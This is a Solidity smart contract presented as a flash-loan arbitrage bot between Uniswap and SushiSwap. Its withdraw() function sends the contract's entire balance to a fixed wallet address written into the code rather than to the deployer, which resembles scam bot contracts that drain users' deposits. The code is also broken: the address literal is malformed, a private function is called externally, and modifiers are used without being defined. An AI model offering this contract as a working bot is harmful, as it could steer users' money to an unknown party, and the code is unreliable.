// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import necessary dependencies
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/FlashLoanReceiverBase.sol";
import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPoolAddressesProvider.sol";
import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPool.sol";
import "https://github.com/sushiswap/sushiswap/blob/master/contracts/uniswapv2/interfaces/IUniswapV2Router02.sol";

// Main contract
contract FlashArbBot is FlashLoanReceiverBase {
    event ArbitrageCompleted(uint256 profit);
    event ArbitrageFailed(bytes error);

    uint256 public constant DEADLINE = 300; // 5 minutes
    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Router02 public sushiswapV1Router;
    
    IERC20 public dai;
    address public daiTokenAddress;
    uint256 public amountToTrade;
    uint256 public tokensOut;

    constructor(address _aaveLendingPool, IUniswapV2Router02 _uniswapV2Router, IUniswapV2Router02 _sushiswapV1Router)
        FlashLoanReceiverBase(_aaveLendingPool)
    {
        uniswapV2Router = _uniswapV2Router;
        sushiswapV1Router = _sushiswapV1Router;
    }

    function flashloan(
        address _flashAsset,
        uint256 _amount,
        address _daiTokenAddress,
        uint256 _amountToTrade,
        uint256 _tokensOut
    ) external onlyOwner {
        require(_amount > 0, "Invalid amount");
        require(_amountToTrade > 0, "Invalid ETH amount");
        
        daiTokenAddress = _daiTokenAddress;
        dai = IERC20(daiTokenAddress);
        amountToTrade = _amountToTrade;
        tokensOut = _tokensOut;

        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), _flashAsset, _amount, "");
    }

    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params
    ) external override nonReentrant {
        require(msg.sender == addressesProvider.getLendingPool(), "Unauthorized");
        require(_amount <= getBalanceInternal(address(this), _reserve), "Invalid balance");

        uint256 initialBalance = address(this).balance;
        
        try this.executeArbitrage() {
            uint256 finalBalance = address(this).balance;
            uint256 profit = finalBalance - initialBalance;
            
            emit ArbitrageCompleted(profit);
        } catch (bytes memory reason) {
            emit ArbitrageFailed(reason);
            revert("Arbitrage failed, reverting transaction.");
        }

        uint256 totalDebt = _amount + _fee;
        transferFundsBackToPoolInternal(_reserve, totalDebt);
    }

    function executeArbitrage() private {
        address[] memory path = getPathForETHToToken(daiTokenAddress);
        
        uniswapV2Router.swapETHForExactTokens{
            value: amountToTrade
        }(
            tokensOut,
            path,
            address(this),
            block.timestamp + DEADLINE
        );

        uint256 tokenAmount = dai.balanceOf(address(this));
        dai.approve(address(sushiswapV1Router), tokenAmount);

        path = getPathForTokenToETH(daiTokenAddress);
        sushiswapV1Router.swapExactTokensForETH(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + DEADLINE
        );
    }

    function getPathForETHToToken(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = token;
        return path;
    }

    function getPathForTokenToETH(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapV2Router.WETH();
        return path;
    }

    function withdraw() external onlyOwner {
        address payable wallet = payable(0x513749253f8110aeE0c28e17219763e87C3f17a);
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");

        (bool success, ) = wallet.call{value: balance}("");
        require(success, "Withdrawal failed");
    }
}